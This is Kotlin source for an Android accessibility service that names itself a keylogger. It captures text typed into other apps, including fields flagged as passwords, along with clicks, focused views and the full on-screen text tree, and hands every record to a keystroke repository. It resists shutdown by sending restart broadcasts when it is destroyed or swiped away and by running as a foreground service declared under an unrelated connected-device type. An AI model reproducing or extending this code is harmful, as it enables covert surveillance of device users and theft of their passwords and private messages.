package com.android.myapp.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Notification
import android.app.PendingIntent
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Binder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import com.android.myapp.capture.EventProcessor
import com.android.myapp.data.CapturedEvent
import com.android.myapp.KeyloggerApplication
import com.android.myapp.R
import com.android.myapp.capture.VisualTreeCapture
import com.android.myapp.core.BatteryConfig
import com.android.myapp.core.VersionManager
import com.android.myapp.data.repository.KeystrokeRepository
import com.android.myapp.receiver.ServiceRestartReceiver
import com.android.myapp.ui.DashboardActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import timber.log.Timber

class KeyloggerAccessibilityService : AccessibilityService() {

    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    private lateinit var eventProcessor: EventProcessor
    private lateinit var visualTreeCapture: VisualTreeCapture

    private val binder = LocalBinder()
    private val handler = Handler(Looper.getMainLooper())

    // Health monitoring state
    private var lastBleDevicesSeen = 0
    private var lastWakeSource = "unknown"
    private var serviceStartTime = 0L
    private val TAG: String = "KeyloggerAccessibilityService"
    private var healthCheckRunnable: Runnable? = null

    inner class LocalBinder : Binder() {
        fun getService(): KeyloggerAccessibilityService = this@KeyloggerAccessibilityService
    }

    companion object {
        const val NOTIFICATION_ID = 1001

        @Volatile
        private var serviceInstance: KeyloggerAccessibilityService? = null
            private set

        @Volatile
        var isRunning = false
            private set

    }

    override fun onCreate() {
        super.onCreate()
        Timber.tag(TAG).d("AccessibilityService created")
        serviceInstance = this
        isRunning = true
        serviceStartTime = System.currentTimeMillis()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Timber.tag(TAG).d("onStartCommand - action: ${intent?.action}, startId: $startId")

        // Get wake source if provided
        lastWakeSource = intent?.getStringExtra("wake_trigger") ?: "direct_start"

        // Start as foreground service with proper type
        startForegroundWithType()

        // Start monitoring
        startServiceMonitoring()

        // Return START_STICKY to request restart if killed
        return START_STICKY
    }

    /**
     * Start foreground service with correct type connectedDevice for Android 14+
     * the type connectedDevice is perfect for BLE/Bluetooth operations
     */
    private fun startForegroundWithType() {
        val notification = createNotification()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Android 14+ - must specify foreground service type
            ServiceCompat.startForeground(
                this,
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10-13
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE
            )
        } else {
            // Android 9 and below
            startForeground(NOTIFICATION_ID, notification)
        }
        Timber.tag(TAG).d("Foreground service started with connectedDevice type")
    }

    /**
     * Start the main service monitoring loop.
     * Uses BatteryConfig for service check interval.
     */
    private fun startServiceMonitoring() {
        Timber.tag(TAG).d("Start monitoring (interval: ${BatteryConfig.servicePersistenceCheckMs / 1000}s)...")

        // Remove any existing runnable
        healthCheckRunnable?.let { handler.removeCallbacks(it) }

        // Health check based on BatteryConfig interval
        healthCheckRunnable = object : Runnable {
            override fun run() {
                performHealthCheck()
                handler.postDelayed(this, BatteryConfig.servicePersistenceCheckMs)
            }
        }

        handler.postDelayed(healthCheckRunnable!!, BatteryConfig.servicePersistenceCheckMs)
    }

    /**
     * Perform periodic health check.
     */
    private fun performHealthCheck() {
        // val uptime = (System.currentTimeMillis() - serviceStartTime) / 1000

        // Update notification with status
        updateNotification()
    }

    /**
     * Called when BLE devices are seen (from mesh wake system).
     */
    fun onBleDevicesSeen(count: Int) {
        lastBleDevicesSeen = count
    }

    /**
     * Create the foreground notification.
     */
    private fun createNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, DashboardActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        val uptime = if (serviceStartTime > 0) {
            (System.currentTimeMillis() - serviceStartTime) / 1000
        } else {
            0L
        }

        val profileEmoji = when (BatteryConfig.currentProfile) {
            BatteryConfig.PowerProfile.AGGRESSIVE -> "🔴"
            BatteryConfig.PowerProfile.BALANCED -> "🟡"
            BatteryConfig.PowerProfile.BATTERY_SAVER -> "🟢"
        }

        return NotificationCompat.Builder(this, KeyloggerApplication.CHANNEL_SERVICE)
            .setContentTitle("KeyloggerAccessibilityService is Active $profileEmoji")
            .setContentText("${BatteryConfig.currentProfile} • ${formatUptime(uptime)}")
            .setSmallIcon(R.drawable.icon_hacker)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .addAction(
                R.drawable.icon_hacker,
                "View Status",
                pendingIntent
            )
            .build()
    }

    /**
     * Update the notification with current status.
     */
    private fun updateNotification() {
        val notification = createNotification()
        val notificationManager = getSystemService(android.app.NotificationManager::class.java)
        notificationManager.notify(NOTIFICATION_ID, notification)
    }

    /**
     * Format uptime for display.
     */
    private fun formatUptime(seconds: Long): String {
        return when {
            seconds < 60 -> "${seconds}s"
            seconds < 3600 -> "${seconds / 60}m ${seconds % 60}s"
            else -> "${seconds / 3600}h ${(seconds % 3600) / 60}m"
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Timber.tag(TAG).d("AccessibilityService connected")

        // Configure service info
        configureServiceInfo()

        // Initialize Event Processor & Visual Tree Capture
        eventProcessor = EventProcessor(this)
        visualTreeCapture = VisualTreeCapture(KeystrokeRepository(this))

        // Start foreground service if required by Android version
        if (VersionManager.getCapabilities().requiresForegroundService) {
            startForegroundServiceWithNotification()
        }

        isRunning = true
        Timber.tag(TAG).d("AccessibilityService is now running")
    }

    private fun configureServiceInfo() {
        val info = AccessibilityServiceInfo().apply {
            eventTypes =
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_FOCUSED or
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_VIEW_CLICKED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED

            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC

            flags =
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS

            notificationTimeout = 100
        }

        setServiceInfo(info)
    }

    private fun startForegroundServiceWithNotification() {
        val notification = createNotification()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Android 14+ requires specific foreground service type
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(NOTIFICATION_ID, notification)
        }

        Timber.tag(TAG).d("Started as foreground service")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let { processEvent(it) }
    }

    private fun processEvent(event: AccessibilityEvent) {
        serviceScope.launch {
            try {
                when (event.eventType) {
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event)
                    AccessibilityEvent.TYPE_VIEW_FOCUSED -> handleViewFocused(event)
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> handleWindowStateChanged(event)
                    AccessibilityEvent.TYPE_VIEW_CLICKED -> handleViewClicked(event)
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> handleContentChanged(event)
                }
            } catch (e: Exception) {
                Timber.tag(TAG).e(e, "Error processing event")
            }
        }
    }

    // ------------------------------
    //         event handlers
    // ------------------------------

    private suspend fun handleTextChanged(event: AccessibilityEvent) {
        val text = event.text?.joinToString(" ") ?: return
        if (text.isEmpty()) return

        val capturedEvent = CapturedEvent(
            timestamp = System.currentTimeMillis(),
            packageName = event.packageName?.toString() ?: "unknown",
            className = event.className?.toString(),
            eventType = "text_changed",
            text = text,
            isPassword = event.isPassword,
            viewId = getViewId(event)
        )

        eventProcessor.processEvent(capturedEvent)
        visualTreeCapture.captureVisualTree(event.source!!, event.packageName as String)
    }

    private suspend fun handleViewFocused(event: AccessibilityEvent) {
        val source = event.source ?: return

        // Extract information from focused view
        val capturedEvent = CapturedEvent(
            timestamp = System.currentTimeMillis(),
            packageName = event.packageName?.toString() ?: "unknown",
            className = event.className?.toString(),
            eventType = "view_focused",
            text = source.text?.toString(),
            isPassword = source.isPassword,
            viewId = source.viewIdResourceName,
            contentDescription = source.contentDescription?.toString()
        )

        eventProcessor.processEvent(capturedEvent)
        visualTreeCapture.captureVisualTree(event.source!!, event.packageName as String)
        // source.recycle()
    }

    private suspend fun handleWindowStateChanged(event: AccessibilityEvent) {
        val capturedEvent = CapturedEvent(
            timestamp = System.currentTimeMillis(),
            packageName = event.packageName?.toString() ?: "unknown",
            className = event.className?.toString(),
            eventType = "window_changed",
            text = null
        )

        eventProcessor.processEvent(capturedEvent)
        visualTreeCapture.captureVisualTree(event.source!!, event.packageName as String)
    }

    private suspend fun handleViewClicked(event: AccessibilityEvent) {
        val source = event.source ?: return

        val capturedEvent = CapturedEvent(
            timestamp = System.currentTimeMillis(),
            packageName = event.packageName?.toString() ?: "unknown",
            className = event.className?.toString(),
            eventType = "view_clicked",
            text = source.text?.toString(),
            viewId = source.viewIdResourceName,
            contentDescription = source.contentDescription?.toString()
        )

        eventProcessor.processEvent(capturedEvent)
        visualTreeCapture.captureVisualTree(event.source!!, event.packageName as String)
        // source.recycle()
    }

    private suspend fun handleContentChanged(event: AccessibilityEvent) {
        // Process content changes more carefully to avoid spam
        if (event.packageName == packageName) {
            return // Ignore our own app
        }

        val source = event.source
        if (source != null) {
            extractTextFromNodeTree(source)
            // source.recycle()
        }
    }

    private suspend fun extractTextFromNodeTree(rootNode: AccessibilityNodeInfo) {
        val textBuilder = StringBuilder()
        extractTextRecursive(rootNode, textBuilder)

        if (textBuilder.isNotEmpty()) {
            val capturedEvent = CapturedEvent(
                timestamp = System.currentTimeMillis(),
                packageName = rootNode.packageName?.toString() ?: "unknown",
                className = rootNode.className?.toString(),
                eventType = "content_tree",
                text = textBuilder.toString()
            )

            eventProcessor.processEvent(capturedEvent)
        }
    }

    private fun extractTextRecursive(node: AccessibilityNodeInfo, builder: StringBuilder) {
        try {
            node.text?.let { builder.append(it).append(" ") }
            node.contentDescription?.let { builder.append(it).append(" ") }

            for (i in 0 until node.childCount) {
                node.getChild(i)?.let {
                    extractTextRecursive(it, builder)
                    it.recycle()
                }
            }
        } catch (e: Exception) {
            Timber.tag(TAG).e(e, "Error extracting text from node")
        }
    }

    private fun getViewId(event: AccessibilityEvent): String? {
        return try {
            event.source?.viewIdResourceName
        } catch (e: Exception) {
            null
        }
    }

    override fun onInterrupt() {
        Timber.tag(TAG).w("AccessibilityService interrupted")
    }

    override fun onDestroy() {
        Timber.tag(TAG).d("═══════════════════════════════════════")
        Timber.tag(TAG).d("KeyloggerAccessibilityService onDestroy")

        isRunning = false
        serviceInstance = null
        handler.removeCallbacksAndMessages(null)

        // Trigger restart via broadcast
        Timber.tag(TAG).d("Sending restart broadcast...")
        sendBroadcast(Intent(this, ServiceRestartReceiver::class.java))

        Timber.tag(TAG).d("Service destroyed - restart triggered")
        Timber.tag(TAG).d("═══════════════════════════════════════")

        serviceScope.cancel()
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        Timber.tag(TAG).d("onTaskRemoved - app swiped from recents")

        // Trigger restart
        sendBroadcast(Intent(this, ServiceRestartReceiver::class.java))

        super.onTaskRemoved(rootIntent)
    }
}